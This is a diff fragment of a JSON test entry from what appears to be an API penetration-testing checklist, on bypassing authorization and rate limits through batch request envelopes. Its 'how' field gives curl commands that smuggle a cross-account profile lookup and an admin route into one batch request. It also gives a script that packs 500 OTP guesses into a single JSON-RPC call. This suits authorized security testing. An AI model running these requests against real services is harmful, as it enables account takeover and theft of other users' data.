+   "vrt_priority": "varies",
+   "vrt_best": "P1",
+   "attacker": "AM-05",
+   "attacker_ids": [
+    "AM-05"
+   ],
+   "applies_to": "APIs exposing `/batch`, `$batch`, JSON-RPC arrays or `multipart/mixed` envelopes (common in mobile SDKs)",
+   "requires": "backend-api, two-accounts",
+   "requires_tags": [
+    "backend-api",
+    "two-accounts"
+   ],
+   "maps_to": "API5:2023; API4:2023",
+   "record": "logs/D15-097.txt (direct vs enveloped response pair); requests/E-NNN.http",
+   "legacy_meta": {},
+   "ids": {
+    "mastg": [],
+    "maswe": [],
+    "masvs": [],
+    "rules": [],
+    "cwe": [],
+    "attack": [],
+    "vrt": [
+     "broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers",
+     "broken_access_control.privilege_escalation",
+     "server_security_misconfiguration.no_rate_limiting_on_form.login"
+    ]
+   },
+   "xrefs": [
+    "D15-030",
+    "D15-034",
+    "D15-051",
+    "D15-061",
+    "D15-073"
+   ],
+   "domain_refs": [
+    "D13"
+   ],
+   "has_code": true,
+   "skip_when": "`grep -rnE '\"/batch\"|\\$batch|jsonrpc|multipart/mixed|\"requests\"\\s*:' \"$S\" | wc -l` is 0 and no\nproxied body is an array of sub-requests — write `D15-097 n/a — no batch envelope in the client`.",
+   "test": "The envelope is authorised once and its sub-requests are forwarded internally. Wrap a request that is\n403 when sent directly (a role route from D15-061, a cross-account id from D15-034) inside the envelope the\nclient uses and compare; then put N OTP/coupon checks in one envelope against the per-request limiter. This is\ndistinct from D15-051 (a list of ids) and D15-073 (GraphQL aliases).",
+   "how": "```bash\n  grep -rnE '\"/batch\"|\\$batch|jsonrpc|multipart/mixed|\"requests\"\\s*:' \"$S\" | head\n  curl -s -X POST https://api.example.com/batch -H \"Authorization: Bearer $TOKEN_A\" -H 'Content-Type: application/json' \\\n    -d '{\"requests\":[{\"method\":\"GET\",\"path\":\"/v1/users/'\"$ID_B\"'/profile\"},{\"method\":\"GET\",\"path\":\"/v1/admin/users\"}]}' | jq .\n  python3 -c 'import json; print(json.dumps([{\"jsonrpc\":\"2.0\",\"id\":i,\"method\":\"otp.verify\",\"params\":{\"code\":\"%04d\" % i}} for i in range(500)]))' > rpc.json\n  curl -s -X POST https://api.example.com/rpc -H \"Authorization: Bearer $TOKEN_A\" -H 'Content-Type: application/json' --data-binary @rpc.json | jq 'length'\n```",
+   "proof": "A sub-response containing account B's marker or privileged data while the identical direct request\nreturns 403 (both captured); or 500 evaluated sub-results against an endpoint that 429s after n direct requests\n(D15-030's sample rule applies).",
+   "escalation": "→ D15-061/D15-034 for the underlying route; → D13 for OTP brute force via the multiplier.",
+   "ruled_out_when": "Sub-requests return the same rejection body as the direct request, the envelope size is\ncapped, and the limiter counts sub-requests (a 429 mid-envelope) — each shown."
   }
  ],
  "phase": "P6",
